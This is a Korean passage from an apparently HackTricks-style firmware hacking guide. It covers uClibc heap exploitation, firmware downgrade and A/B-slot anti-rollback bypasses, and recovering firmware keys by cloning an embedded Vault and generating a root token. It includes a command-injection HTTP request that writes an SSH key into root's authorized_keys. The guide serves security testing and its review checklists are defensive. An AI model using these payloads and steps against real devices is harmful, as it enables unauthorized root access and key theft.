## Binary Exploitation 및 Proof-of-Concept

식별된 취약점의 PoC를 개발하려면 대상 아키텍처를 깊이 이해하고 low-level 언어로 프로그래밍해야 합니다. 임베디드 시스템에서는 binary runtime protection이 드물지만, 적용된 경우 Return Oriented Programming (ROP) 같은 기법이 필요할 수 있습니다.

### uClibc fastbin exploitation 참고 사항 (임베디드 Linux)

- **Fastbin + consolidation:** uClibc는 glibc와 유사한 fastbin을 사용합니다. 이후의 대규모 할당에서 `__malloc_consolidate()`가 실행될 수 있으므로 fake chunk는 검사를 통과해야 합니다(적절한 size, `fd = 0`, 주변 chunk가 "in use" 상태로 인식됨).<sup>[[6]](#references)</sup>
- **ASLR이 적용된 non-PIE binary:** ASLR이 활성화되어 있어도 메인 binary가 **non-PIE**라면 binary 내 `.data/.bss` 주소는 안정적입니다. 이미 유효한 heap chunk header처럼 보이는 영역을 대상으로 fastbin 할당이 **function pointer table**에 도달하도록 할 수 있습니다.
- **파서를 멈추는 NUL:** JSON을 파싱할 때 payload의 `\x00`은 파싱을 멈추게 하면서도 stack pivot/ROP chain에 사용할 공격자 제어 후행 바이트는 유지할 수 있습니다.
- **`/proc/self/mem`을 통한 shellcode:** `open("/proc/self/mem")`, `lseek()`, `write()`를 호출하는 ROP chain으로 알려진 mapping에 실행 가능한 shellcode를 배치하고 해당 위치로 점프할 수 있습니다.

## Firmware Analysis용 사전 구성 운영 체제

[AttifyOS](https://github.com/adi0x90/attifyos) 및 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 같은 운영 체제는 firmware 보안 테스트에 필요한 도구를 갖춘 사전 구성 환경을 제공합니다.

## Firmware 분석용 사전 구성 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 Internet of Things (IoT) 장치의 보안 평가와 penetration testing을 돕기 위해 만들어진 배포판입니다. 필요한 도구가 모두 설치된 사전 구성 환경을 제공해 시간을 크게 절약할 수 있습니다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware 보안 테스트 도구가 미리 설치된 Ubuntu 18.04 기반 임베디드 보안 테스트 운영 체제입니다.

## Firmware Downgrade 공격 및 안전하지 않은 업데이트 메커니즘

제조업체가 firmware image의 암호화 서명 검증을 구현하더라도 **버전 롤백(downgrade) 방지**는 자주 누락됩니다. boot- 또는 recovery-loader가 내장된 공개 키로 서명만 확인하고 플래시할 image의 *버전*(또는 monotonic counter)을 비교하지 않는다면, 공격자는 유효한 서명이 여전히 있는 **더 오래되고 취약한 firmware를 정식으로 설치**해 패치된 취약점을 다시 도입할 수 있습니다.<sup>[[4]](#references)</sup>

일반적인 공격 워크플로:

1. **이전 버전의 서명된 image 확보**
   * 제조업체의 공개 다운로드 포털, CDN 또는 지원 사이트에서 가져옵니다.
   * 관련 모바일/데스크톱 애플리케이션에서 추출합니다(예: Android APK 내 `assets/firmware/`).
   * VirusTotal, Internet archive, 포럼 등의 타사 저장소에서 가져옵니다.
2. 노출된 업데이트 채널을 통해 image를 장치에 **업로드하거나 제공합니다**.
   * Web UI, 모바일 앱 API, USB, TFTP, MQTT 등
   * 많은 소비자용 IoT 장치는 인증되지 않은 HTTP(S) endpoint를 노출해 Base64 인코딩 firmware blob을 받고, 서버 측에서 디코딩한 뒤 recovery/upgrade를 실행합니다.
3. downgrade 후에는 최신 버전에서 패치된 취약점(예: 이후 추가된 command-injection filter)을 악용합니다.
4. 선택적으로 persistence를 확보한 후 탐지를 피하기 위해 최신 image를 다시 플래시하거나 업데이트를 비활성화합니다.

### 예시: Downgrade 후 Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

취약한(다운그레이드된) firmware에서는 `md5` 매개변수가 정제 과정 없이 셸 명령에 직접 연결되어 임의의 명령을 삽입할 수 있습니다(여기서는 SSH 키 기반 root 액세스를 활성화함). 이후 firmware 버전에서는 기본적인 문자 필터를 도입했지만, 다운그레이드 방지 기능이 없어 이 수정은 무용지물이 됩니다.<sup>[[4]](#references)</sup>

### 모바일 앱에서 Firmware 추출하기

많은 공급업체는 앱이 Bluetooth/Wi-Fi를 통해 장치를 업데이트할 수 있도록 모바일 동반 앱에 전체 firmware 이미지를 함께 제공합니다. 이러한 패키지는 일반적으로 `assets/fw/` 또는 `res/raw/`와 같은 경로의 APK/APEX에 암호화되지 않은 상태로 저장됩니다. `apktool`, `ghidra`, 심지어 기본 `unzip` 같은 도구를 사용하면 실제 하드웨어에 접근하지 않고도 서명된 이미지를 추출할 수 있습니다.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot 설계에서 updater 전용 anti-rollback 우회

일부 벤더는 anti-downgrade **ratchet**을 구현하지만, *updater* 로직 안에서만 적용합니다(예: CAN을 통한 UDS 루틴, recovery 명령 또는 userspace OTA agent). 이후 **bootloader**가 이미지 서명/CRC만 확인하고 partition table 또는 slot 메타데이터를 신뢰한다면, rollback protection은 여전히 우회될 수 있습니다.<sup>[[7]](#references)</sup>

일반적인 취약 설계:

- 펌웨어 메타데이터에 버전 설명자와 **security ratchet** / monotonic counter가 모두 포함됩니다.
- updater는 이미지의 ratchet을 persistent storage에 저장된 값과 비교해, 더 오래된 서명된 이미지를 거부합니다.
- **bootloader**는 해당 ratchet을 파싱하지 않고, 선택된 slot을 부팅하기 전에 header, CRC, signature만 검증합니다.
- Slot 활성화 정보는 partition table 또는 slot별 generation counter에 별도로 저장되며, 검증된 정확한 펌웨어 digest와 **암호학적으로 연결되어 있지 않습니다**.

이로 인해 dual-slot 시스템에서 **한 이미지를 검증하고 다른 이미지를 부팅하는** primitive가 생깁니다. 공격자가 updater가 현재 서명된 이미지를 이용해 slot B를 다음 부팅 대상으로 표시하게 한 뒤, 재부팅 전에 slot B를 덮어쓸 수 있다면, bootloader는 이미 커밋된 slot 메타데이터만 신뢰하므로 오래된 이미지도 부팅할 수 있습니다.

일반적인 악용 패턴:

1. **현재 서명된** 펌웨어를 비활성 slot에 업로드하고, 정상적인 검증/전환 루틴을 실행해 해당 slot이 다음 활성 slot으로 표시되도록 합니다.
2. **아직 재부팅하지 않습니다**. 같은 세션에서 slot 준비/삭제 루틴을 다시 실행합니다.
3. 오래된 boot-state 또는 slot 선택 로직을 악용해 updater가 방금 활성화한 **동일한 물리 slot**을 삭제하게 합니다.
4. 해당 slot에 **더 오래되었지만 여전히 서명된** 펌웨어를 기록합니다.
5. ratchet을 적용하는 검증 루틴을 건너뛰고 바로 재부팅합니다.
6. Bootloader는 활성화된 slot을 선택하고, 서명/무결성만 확인한 뒤 오래된 이미지를 부팅합니다.

A/B 업데이트 구현을 분석할 때 확인할 사항:

- Slot 선택이 성공적인 전환 후 갱신되지 않는 **부팅 시점 플래그**에서 결정되는지 확인합니다.
- `prepare_passive_slot()` 형태의 루틴이 **현재 커밋된 레이아웃**이 아니라 오래된 상태를 기준으로 slot을 삭제하는지 확인합니다.
- `part_write_layout()` 형태의 함수가 검증된 이미지 hash를 저장하지 않고 **generation counter** / 활성 플래그만 갱신하는지 확인합니다.
- Ratchet 검사가 userspace 또는 updater 코드에만 있고 ROM / bootloader / secure boot 단계에는 없는지 확인합니다.
- 삭제 또는 recovery 루틴이 slot의 콘텐츠를 제거하고 다시 기록한 뒤에도 해당 slot을 부팅 가능한 상태로 남기는지 확인합니다.

### 업데이트 로직 평가 체크리스트

* *Update endpoint*의 전송/인증이 적절히 보호되는가(TLS + authentication)?
* 플래싱 전에 기기가 **버전 번호** 또는 **monotonic anti-rollback counter**를 비교하는가?
* 이미지가 secure boot chain 안에서 검증되는가(예: ROM 코드가 서명을 확인)?
* **Bootloader가 updater와 동일한 ratchet을 적용하는가**, 아니면 signature/CRC만 확인하는가?
* Slot 활성화 메타데이터가 **검증된 펌웨어 digest/version에 연결**되어 있는가, 아니면 활성화 후 slot을 수정할 수 있는가?
* Slot 전환이 성공하면 기기가 강제로 재부팅되는가, 아니면 같은 세션에서 이후 업데이트/삭제 루틴을 계속 실행할 수 있는가?
* Userland 코드가 추가 유효성 검사(예: 허용된 partition map, 모델 번호)를 수행하는가?
* *부분* 또는 *백업* 업데이트 흐름에서도 동일한 검증 로직을 재사용하는가?

> 💡  위 항목 중 하나라도 빠져 있다면, 해당 플랫폼은 rollback 공격에 취약할 가능성이 높습니다.

## 연습용 취약 펌웨어

펌웨어의 취약점을 찾는 연습을 시작할 때 다음 취약 펌웨어 프로젝트를 사용하세요.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 임베디드 KMS/Vault 상태에서 펌웨어 복호화 키 복구

업데이트 이미지에 작은 평문 메타데이터와 큰 고엔트로피 blob이 함께 들어 있다면, 무차별 대입을 시도하기 전에 컨테이너를 먼저 분석하세요:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d`, `binwalk -E`를 사용해 header, offset, 줄 경계를 덤프합니다.
- `Salted__`는 보통 OpenSSL `enc` 형식이라는 뜻입니다. 다음 8바이트는 salt이고 나머지 바이트는 ciphertext입니다.
- 디코딩 결과가 정확히 `256`바이트인 Base64 필드는, 임의의 펌웨어 password/session key를 감싼 RSA-2048 ciphertext일 가능성이 높다는 단서입니다.
- 같은 파일에 분리된 PGP 데이터가 있다면, 이는 인증만 보호하는 경우가 많습니다. 이를 기밀성 보호 수단이라고 단정하지 마세요.

정적 키 검색(`grep`, `strings`, PEM/PGP 검색)에 실패하면 private key만 찾지 말고 **운영 중인 복호화 경로**를 역공학하세요.

- Updater / management 바이너리를 디컴파일하고, 암호화된 blob을 읽는 주체, 이를 unwrap하는 helper/API, 요청하는 논리적 key name을 추적합니다.
- 추출한 root filesystem에서 KMS 상태(`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`)와 unit 파일 및 init script를 검색합니다.
- 평문 `vault operator unseal ...`, recovery key, bootstrap token 또는 로컬 KMS auto-unseal script는 private-key 자료와 동일하게 취급합니다.

기기에 원본 Vault 바이너리와 storage backend가 함께 포함되어 있다면, Vault 내부 동작을 재구현하는 것보다 해당 환경을 재현하는 편이 대개 더 쉽습니다.

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

복제된 KMS에서 root 권한으로:

- transit 키를 격리된 clone 내부에서만 내보낼 수 있도록 설정합니다: `vault write transit/keys/<name>/config exportable=true`
- unwrap 키를 내보냅니다: `vault read transit/export/encryption-key/<name>`
- 복구한 RSA 키에 KMS에서 사용한 정확한 padding/hash 조합을 적용해 봅니다. PKCS#1 v1.5 복호화와 기본 OAEP 복호화가 실패해도 키가 잘못되었다는 뜻은 **아닙니다**. Vault 기반 흐름 중 상당수는 SHA-256을 사용하는 OAEP를 사용하는 반면, 일반적인 라이브러리는 기본값으로 SHA-1을 사용합니다.
- 페이로드가 `Salted__`로 시작하면 AES-CBC 복호화를 시도하기 전에 벤더의 OpenSSL KDF(`EVP_BytesToKey`, 구형 appliance에서는 흔히 MD5 사용)를 정확히 재현합니다.

이렇게 하면 "암호화된 firmware"는 더 일반적인 문제로 바뀝니다. **appliance 측의 운영 키를 복구한 다음, 정확한 unwrap + KDF 파라미터를 오프라인에서 재현합니다**.

## 교육 및 자격증

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude로 Firmware 해독하기: 시니어급 역량, 주니어급 자율성](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware 보안 테스트 방법론](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [실전 IoT 해킹: 사물 인터넷 공격을 위한 결정판 가이드](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [폐기된 하드웨어의 zero-day 취약점 악용 – Trail of Bits 블로그](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20달러짜리 Smart Device로 집에 접근할 수 있었던 방법](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [이제 mi가 보이죠: 이제 당신은 Pwned입니다](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 충전 포트 커넥터를 통해 Tesla Wall Connector 악용하기 - 2부: anti-downgrade 우회](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [깜빡이게 만들기: Philips Hue Bridge의 Over-the-Air 악용](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU에서 Tesla OS ROOT하기 2부: 디버깅 및 수정](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [10] [Dell BIOS Password: 약한 XOR 암호화로 SPI Flash에서 복구 가능 (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [11] [R3n5k1/dellpwn - Dell BIOS password 복구 도구](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
